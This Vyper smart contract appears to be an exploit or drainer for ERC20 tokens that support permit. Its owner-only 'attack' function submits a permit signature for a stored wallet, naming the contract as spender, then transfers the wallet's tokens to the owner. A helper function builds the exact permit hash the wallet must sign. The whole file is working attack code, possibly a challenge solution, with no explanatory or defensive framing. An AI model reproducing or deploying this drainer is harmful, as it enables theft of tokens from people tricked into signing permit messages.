# @version ^0.3.7

from vyper.interfaces import ERC20 as IERC20

owner: immutable(address)

_PERMIT_TYPE_HASH: constant(bytes32) = keccak256("Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)")

token: address
wallet: address

@external
@payable
def __init__(_token: address, _wallet: address):
    owner = msg.sender
    self.token = _token
    self.wallet = _wallet

@external
def attack(deadline: uint256, amount: uint256, v: uint8, r: bytes32, s: bytes32):
    assert msg.sender == owner, "!owner"
    raw_call(
        self.token,
        _abi_encode(
            self.wallet,
            self,
            amount,
            deadline,
            v,
            r,
            s,
            method_id=method_id(
                "permit(address,address,uint256,uint256,uint8,bytes32,bytes32)"
            )
        ),
    )
    IERC20(self.token).transferFrom(self.wallet, owner, amount)

@external
@view
def get_permit_hash(deadline: uint256, amount: uint256) -> bytes32:
    current_nonce: uint256 = convert(raw_call(self.token, _abi_encode(self.wallet, method_id=method_id("nonces(address)")), max_outsize=32, is_static_call=True), uint256)

    domain_separator: bytes32 = convert(raw_call(self.token, method_id("DOMAIN_SEPARATOR()"), max_outsize=32, is_static_call=True), bytes32)

    struct_hash: bytes32 = keccak256(_abi_encode(_PERMIT_TYPE_HASH, self.wallet, self, amount, current_nonce, deadline))

    permit_hash: bytes32 = keccak256(concat(b"\x19\x01", domain_separator, struct_hash))

    return permit_hash
